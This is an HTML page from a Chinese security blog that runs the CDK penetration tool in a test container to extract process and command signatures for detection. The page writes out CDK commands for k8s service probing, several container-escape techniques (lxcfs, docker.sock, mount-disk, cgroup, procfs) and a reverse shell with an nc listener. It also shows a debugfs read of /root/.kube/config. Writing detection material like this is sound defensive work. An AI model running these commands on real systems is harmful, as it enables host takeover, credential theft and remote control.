@@ -1,0 +1,92 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>自动化渗透工具CDK特征检测 · Sally's Blog</title><meta name="description" content="CDK网络探测-k8s组件探测进入测试容器中查看k8s环境变量
+1env |grep KUBE
+
+
+网络探测扫描整个C段中开放的k8s api端点
+1./cdk run service-probe 10.96.0.1-255
+
+
+特征提取进程特征由于扫描的时间长，该进程很容易被检测到，以bash为父"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>自动化渗透工具CDK特征检测</a></h3></div><div class="post-content"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
+<h2 id="CDK网络探测-k8s组件探测"><a href="#CDK网络探测-k8s组件探测" class="headerlink" title="CDK网络探测-k8s组件探测"></a>CDK网络探测-k8s组件探测</h2><p>进入测试容器中查看k8s环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env |grep KUBE</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102257655.png" alt="image-20240117102257655"></p>
+<p>网络探测扫描整个C段中开放的k8s api端点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe 10.96.0.1-255</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102547217.png" alt="image-20240117102547217"></p>
+<h3 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征"><a href="#进程特征" class="headerlink" title="进程特征"></a>进程特征</h4><p>由于扫描的时间长，该进程很容易被检测到，以bash为父进程，cdk为子进程；cdk的参数为run service-probe [IP范围]。</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117102649759.png" alt="image-20240117102649759"></p>
+<h4 id="命令特征"><a href="#命令特征" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run service-probe [IP范围]</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸-lxcfs-cgroup错误配置逃逸"><a href="#CDK容器逃逸-lxcfs-cgroup错误配置逃逸" class="headerlink" title="CDK容器逃逸-lxcfs cgroup错误配置逃逸"></a>CDK容器逃逸-lxcfs cgroup错误配置逃逸</h2><p>运行cdk逃逸脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
+<p>运行debugfs查看host_dev文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
+<h3 id="特征提取-1"><a href="#特征提取-1" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-1"><a href="#进程特征-1" class="headerlink" title="进程特征"></a>进程特征</h4><p>（这里换成了ubuntu镜像好查看进程细节）</p>
+<p>这个不是短进程，查看进程信息，bash为父进程，debugfs为子进程（参数为-w cdk-test，如果是使用cdk则参数固定为-w host_dev）</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
+<h4 id="命令特征-1"><a href="#命令特征-1" class="headerlink" title="命令特征"></a>命令特征</h4><p>以下的命令都是固定的，也是由于CDK内置的原因</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br><span class="line"> debugfs -w host_dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK远程控制-反弹shell"><a href="#CDK远程控制-反弹shell" class="headerlink" title="CDK远程控制-反弹shell"></a>CDK远程控制-反弹shell</h2><p>远程服务器监听端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 14444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104622305.png" alt="image-20240117104622305"></p>
+<p>进入测试容器执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104557076.png" alt="image-20240117104557076"></p>
+<h3 id="特征提取-2"><a href="#特征提取-2" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-2"><a href="#进程特征-2" class="headerlink" title="进程特征"></a>进程特征</h4><p>这个不是短进程，以bash为父进程，cdk为子进程，参数为run reverse-shell IP:端口</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240117104712082.png" alt="image-20240117104712082"></p>
+<h4 id="命令特征-2"><a href="#命令特征-2" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run reverse-shell IP:端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸-docker-sock逃逸PoC-docker-in-docker"><a href="#CDK容器逃逸-docker-sock逃逸PoC-docker-in-docker" class="headerlink" title="CDK容器逃逸-docker.sock逃逸PoC(docker-in-docker)"></a>CDK容器逃逸-docker.sock逃逸PoC(docker-in-docker)</h2><p>进入测试容器，写一个重复执行的脚本去执行CDK命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run docker-sock-check /var/run/docker.sock</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="特征提取-3"><a href="#特征提取-3" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-3"><a href="#进程特征-3" class="headerlink" title="进程特征"></a>进程特征</h4><p>docker.sock的挂载位置可能改变。</p>
+<p>父进程为bash，子进程为cdk，执行的命令参数为run docker-sock-check [docker.sock挂载位置]</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118102141321.png" alt="image-20240118102141321"></p>
+<h4 id="命令特征-3"><a href="#命令特征-3" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-check  [docker.sock挂载位置]</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸-docker-sock命令执行"><a href="#CDK容器逃逸-docker-sock命令执行" class="headerlink" title="CDK容器逃逸-docker.sock命令执行"></a>CDK容器逃逸-docker.sock命令执行</h2><p>进入测试容器执行CDK命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn /var/run/docker.sock <span class="built_in">touch</span> /host/tmp/pwn-success</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104324387.png" alt="image-20240118104324387"></p>
+<h3 id="特征提取-4"><a href="#特征提取-4" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-4"><a href="#进程特征-4" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run docker-sock-pwn [docker.sock位置] [CMD命令]</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118104435091.png" alt="image-20240118104435091"></p>
+<h4 id="命令特征-4"><a href="#命令特征-4" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-sock-pwn [docker.sock位置] [CMD命令]</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸-挂载逃逸-特权容器"><a href="#CDK容器逃逸-挂载逃逸-特权容器" class="headerlink" title="CDK容器逃逸-挂载逃逸(特权容器)"></a>CDK容器逃逸-挂载逃逸(特权容器)</h2><p>进入测试容器，写一个重复执行的脚本执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-disk</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111207956.png" alt="image-20240118111207956"></p>
+<h3 id="特征提取-5"><a href="#特征提取-5" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-5"><a href="#进程特征-5" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run mount-disk</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111342522.png" alt="image-20240118111342522"></p>
+<h4 id="命令特征-5"><a href="#命令特征-5" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-disk</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸Cgroup逃逸（特权容器）"><a href="#CDK容器逃逸Cgroup逃逸（特权容器）" class="headerlink" title="CDK容器逃逸Cgroup逃逸（特权容器）"></a>CDK容器逃逸Cgroup逃逸（特权容器）</h2><p>进入测试容器执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141449945.png" alt="image-20240118141449945"></p>
+<p>查看是否执行成功</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
+<h3 id="特征提取-6"><a href="#特征提取-6" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-6"><a href="#进程特征-6" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程bash，子进程cdk，参数run mount-cgroup [CMD命令]</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141407989.png" alt="image-20240118141407989"></p>
+<h4 id="命令特征-6"><a href="#命令特征-6" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup [CMD命令]</span><br></pre></td></tr></table></figure>
+
+<h2 id="CDK容器逃逸-Procfs目录挂载逃逸"><a href="#CDK容器逃逸-Procfs目录挂载逃逸" class="headerlink" title="CDK容器逃逸-Procfs目录挂载逃逸"></a>CDK容器逃逸-Procfs目录挂载逃逸</h2><p>进入测试容器，写一个重复执行的脚本执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-procfs /tmp/proc <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134531304.png" alt="image-20240118134531304"></p>
+<p>发现宿主机被写入文件</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
+<h3 id="特征提取-7"><a href="#特征提取-7" class="headerlink" title="特征提取"></a>特征提取</h3><h4 id="进程特征-7"><a href="#进程特征-7" class="headerlink" title="进程特征"></a>进程特征</h4><p>父进程为bash，子进程为cdk，参数为run mount-procfs [挂载proc路径]  [CMD命令]</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134937362.png" alt="image-20240118134937362"></p>
+<h4 id="命令特征-7"><a href="#命令特征-7" class="headerlink" title="命令特征"></a>命令特征</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-procfs [挂载proc路径]  [CMD命令]</span><br></pre></td></tr></table></figure>
+
+</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>作者: Sally</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约816个字, 2分钟43秒读完</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://phoenixmerk.github.io/2024/01/17/自动化渗透工具CDK特征检测/,Sally's Blog,自动化渗透工具CDK特征检测,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/01/16/lxcfs%20cgroup%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="lxcfs cgroup错误配置容器逃逸">下一篇</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(无标题)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="想要查找什么..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>
